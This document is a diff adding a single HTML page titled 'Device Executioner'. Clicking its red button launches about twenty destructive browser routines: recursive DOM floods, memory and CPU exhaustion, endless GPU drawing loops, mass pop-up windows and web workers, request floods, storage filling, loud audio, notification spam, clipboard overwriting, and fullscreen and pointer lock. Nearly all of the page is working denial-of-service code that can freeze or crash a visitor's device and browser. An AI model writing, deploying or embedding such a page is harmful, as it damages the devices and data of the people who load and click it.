@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Device Executioner</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            user-select: none;
+        }
+        #executionButton {
+            padding: 30px 60px;
+            font-size: 26px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        #executionButton:hover {
+            background: #aa0000;
+            box-shadow: 0 0 30px #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <button id="executionButton">Execute Device Termination</button>
+
+    <script>
+        document.getElementById('executionButton').addEventListener('click', function() {
+            this.remove();
+            document.body.innerHTML = '<h1 style="color: red; text-align: center; font-size: 40px;">DEVICE EXECUTION INITIATED</h1>';
+
+            function domCataclysm() {
+                var root = document.createElement('div');
+                document.body.appendChild(root);
+                function spawnHell(depth, parent) {
+                    if (depth <= 0) return;
+                    for (var i = 0; i < 5000; i++) {
+                        var div = document.createElement('div');
+                        div.style.cssText = "position: fixed; width: 1px; height: 1px; top: " + (Math.random() * 100) + "%; left: " + (Math.random() * 100) + "%; transform: rotate(" + (Math.random() * 360) + "deg) scale(" + (Math.random() * 20) + ");";
+                        div.innerHTML = new Array(50001).join('x');
+                        parent.appendChild(div);
+                        spawnHell(depth - 1, div);
+                    }
+                }
+                try {
+                    spawnHell(10, root);
+                } catch (e) {}
+            }
+
+            function memoryAbyss() {
+                var abyssStorage = [];
+                try {
+                    while (true) {
+                        abyssStorage.push(new ArrayBuffer(1024 * 1024 * 2000));
+                        abyssStorage.push(new Uint8Array(1024 * 1024 * 1000).fill(Math.floor(Math.random() * 256)));
+                        abyssStorage.push(new Array(10000000).fill(new Array(50001).join('obliterate')));
+                    }
+                } catch (e) {}
+            }
+
+            function cpuApocalypse() {
+                for (var i = 0; i < 500; i++) {
+                    setTimeout(function() {
+                        var x = 0;
+                        while (true) {
+                            x += Math.random() * Math.sin(x) * Math.cos(x) * Math.tan(x) * Math.exp(x) * Math.log(Math.abs(x + 1));
+                            x = Math.pow(x, 20) * Math.random();
+                            console.log(new Array(10001).join(x.toString()));
+                        }
+                    }, 0);
+                }
+            }
+
+            function gpuAnnihilation() {
+                for (var i = 0; i < 50; i++) {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = 50000;
+                    canvas.height = 50000;
+                    canvas.style.position = 'fixed';
+                    document.body.appendChild(canvas);
+                    var ctx = canvas.getContext('2d');
+                    setTimeout(function(context) {
+                        while (true) {
+                            context.fillStyle = "rgba(" + (Math.random() * 255) + ", " + (Math.random() * 255) + ", " + (Math.random() * 255) + ", 1)";
+                            context.fillRect(0, 0, 50000, 50000);
+                            context.drawImage(canvas, 0, 0, 50000, 50000);
+                            for (var j = 0; j < 10000; j++) {
+                                context.beginPath();
+                                context.arc(Math.random() * 50000, Math.random() * 50000, Math.random() * 500, 0, Math.PI * 2);
+                                context.fill();
+                            }
+                        }
+                    }.bind(null, ctx), 0);
+                }
+                try {
+                    var webglCanvas = document.createElement('canvas');
+                    var gl = webglCanvas.getContext('webgl2') || webglCanvas.getContext('webgl');
+                    if (gl) {
+                        while (true) {
+                            gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                            gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT | gl.STENCIL_BUFFER_BIT);
+                            for (var k = 0; k < 1000000; k++) {
+                                gl.createBuffer();
+                                gl.createTexture();
+                                gl.createFramebuffer();
+                                gl.createRenderbuffer();
+                                gl.createShader(gl.VERTEX_SHADER);
+                                gl.createShader(gl.FRAGMENT_SHADER);
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function tabObliteration() {
+                try {
+                    while (true) {
+                        for (var i = 0; i < 1000; i++) {
+                            var win = window.open('', '_blank');
+                            if (win) {
+                                win.document.write('<script>while(true){var a=new Array(5000000).fill(Math.random());}</script>');
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function workerHellstorm() {
+                var workerCode = "while(true) { var arr = new Array(50000000).fill(Math.random()); var x = 0; for(var i = 0; i < arr.length; i++) { x += arr[i] * Math.sin(arr[i]) * Math.cos(arr[i]) * Math.exp(arr[i]) * Math.tan(arr[i]); } }";
+                var blob = new Blob([workerCode], { type: 'application/javascript' });
+                var workerURL = URL.createObjectURL(blob);
+                try {
+                    while (true) {
+                        for (var i = 0; i < 1000; i++) {
+                            new Worker(workerURL);
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function eventCollapse() {
+                var dummy = document.createElement('div');
+                document.body.appendChild(dummy);
+                try {
+                    for (var i = 0; i < 50000000; i++) {
+                        dummy.addEventListener('click', function() {
+                            var junk = new Array(10000000).fill(Math.random());
+                            console.log(junk);
+                        });
+                    }
+                    while (true) {
+                        dummy.dispatchEvent(new Event('click'));
+                    }
+                } catch (e) {}
+            }
+
+            function networkCatastrophe() {
+                try {
+                    while (true) {
+                        for (var i = 0; i < 2000; i++) {
+                            fetch('https://example.com?' + Math.random(), { mode: 'no-cors' }).catch(function(){});
+                            var img = new Image();
+                            img.src = 'https://example.com?' + Math.random();
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function storageDestruction() {
+                try {
+                    while (true) {
+                        localStorage.setItem('destroy' + Math.random(), new Array(10000001).join('x'));
+                        sessionStorage.setItem('destroy' + Math.random(), new Array(10000001).join('x'));
+                    }
+                } catch (e) {}
+                try {
+                    while (true) {
+                        indexedDB.open('destroyDB' + Math.random(), Math.random() * 1000000);
+                    }
+                } catch (e) {}
+            }
+
+            function animationInferno() {
+                var style = document.createElement('style');
+                style.textContent = "@keyframes spin { to { transform: rotate(360deg); } } @keyframes scale { to { transform: scale(5); } } @keyframes move { to { top: 100%; left: 100%; } } .inferno { position: fixed; width: 2px; height: 2px; animation: spin 0.01s infinite linear, scale 0.05s infinite alternate, move 0.1s infinite alternate; }";
+                document.head.appendChild(style);
+                for (var i = 0; i < 2000000; i++) {
+                    var div = document.createElement('div');
+                    div.className = 'inferno';
+                    div.style.top = (Math.random() * 100) + '%';
+                    div.style.left = (Math.random() * 100) + '%';
+                    document.body.appendChild(div);
+                }
+            }
+
+            function audioDisaster() {
+                try {
+                    for (var i = 0; i < 500; i++) {
+                        var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                        while (true) {
+                            var oscillator = audioCtx.createOscillator();
+                            var gainNode = audioCtx.createGain();
+                            oscillator.connect(gainNode);
+                            gainNode.connect(audioCtx.destination);
+                            oscillator.frequency.value = Math.random() * 40000;
+                            gainNode.gain.value = 100;
+                            oscillator.start();
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function sensorOverdrive() {
+                try {
+                    window.addEventListener('deviceorientation', function() {
+                        while (true) {
+                            var dummy = new Array(5000000).fill(Math.random());
+                        }
+                    });
+                    window.addEventListener('devicemotion', function() {
+                        while (true) {
+                            var dummy = new Array(5000000).fill(Math.random());
+                        }
+                    });
+                    navigator.geolocation.watchPosition(function() {
+                        while (true) {
+                            var dummy = new Array(5000000).fill(Math.random());
+                        }
+                    });
+                } catch (e) {}
+            }
+
+            function clipboardChaos() {
+                try {
+                    while (true) {
+                        navigator.clipboard.writeText(new Array(5000001).join('chaos'));
+                    }
+                } catch (e) {}
+            }
+
+            function batteryIncineration() {
+                try {
+                    while (true) {
+                        navigator.getBattery().then(function() {
+                            var dummy = new Array(20000000).fill(Math.random());
+                        });
+                    }
+                } catch (e) {}
+                try {
+                    navigator.wakeLock.request('screen').catch(function(){});
+                } catch (e) {}
+            }
+
+            function diskThrash() {
+                try {
+                    while (true) {
+                        if (navigator.storage) {
+                            navigator.storage.persist().then(function() {
+                                var dummy = new Array(10000000).fill(new Array(10001).join('thrash'));
+                            });
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function notificationSpam() {
+                try {
+                    if (Notification.permission === 'granted') {
+                        while (true) {
+                            new Notification('System Overload', { body: new Array(10001).join('spam') });
+                        }
+                    } else {
+                        Notification.requestPermission().then(function() {
+                            while (true) {
+                                new Notification('System Overload', { body: new Array(10001).join('spam') });
+                            }
+                        });
+                    }
+                } catch (e) {}
+            }
+
+            function vibrationOverload() {
+                try {
+                    while (true) {
+                        navigator.vibrate([1000, 1000, 1000, 1000, 1000]);
+                    }
+                } catch (e) {}
+            }
+
+            function fullscreenLock() {
+                try {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    } else if (document.documentElement.mozRequestFullScreen) {
+                        document.documentElement.mozRequestFullScreen();
+                    } else if (document.documentElement.webkitRequestFullscreen) {
+                        document.documentElement.webkitRequestFullscreen();
+                    } else if (document.documentElement.msRequestFullscreen) {
+                        document.documentElement.msRequestFullscreen();
+                    }
+                } catch (e) {}
+            }
+
+            function pointerLock() {
+                try {
+                    if (document.requestPointerLock) {
+                        document.requestPointerLock();
+                    } else if (document.mozRequestPointerLock) {
+                        document.mozRequestPointerLock();
+                    } else if (document.webkitRequestPointerLock) {
+                        document.webkitRequestPointerLock();
+                    }
+                } catch (e) {}
+            }
+
+            function recursionBomb() {
+                function recurseInfinite() {
+                    var arr = new Array(1000000).fill(Math.random());
+                    for (var i = 0; i < arr.length; i++) {
+                        arr[i] = Math.pow(arr[i], 10);
+                    }
+                    recurseInfinite();
+                }
+                try {
+                    recurseInfinite();
+                } catch (e) {}
+            }
+
+            setTimeout(domCataclysm, 0);
+            setTimeout(memoryAbyss, 0);
+            setTimeout(cpuApocalypse, 0);
+            setTimeout(gpuAnnihilation, 0);
+            setTimeout(tabObliteration, 0);
+            setTimeout(workerHellstorm, 0);
+            setTimeout(eventCollapse, 0);
+            setTimeout(networkCatastrophe, 0);
+            setTimeout(storageDestruction, 0);
+            setTimeout(animationInferno, 0);
+            setTimeout(audioDisaster, 0);
+            setTimeout(sensorOverdrive, 0);
+            setTimeout(clipboardChaos, 0);
+            setTimeout(batteryIncineration, 0);
+            setTimeout(diskThrash, 0);
+            setTimeout(notificationSpam, 0);
+            setTimeout(vibrationOverload, 0);
+            setTimeout(fullscreenLock, 0);
+            setTimeout(pointerLock, 0);
+            setTimeout(recursionBomb, 0);
+        });
+    </script>
+</body>
+</html>
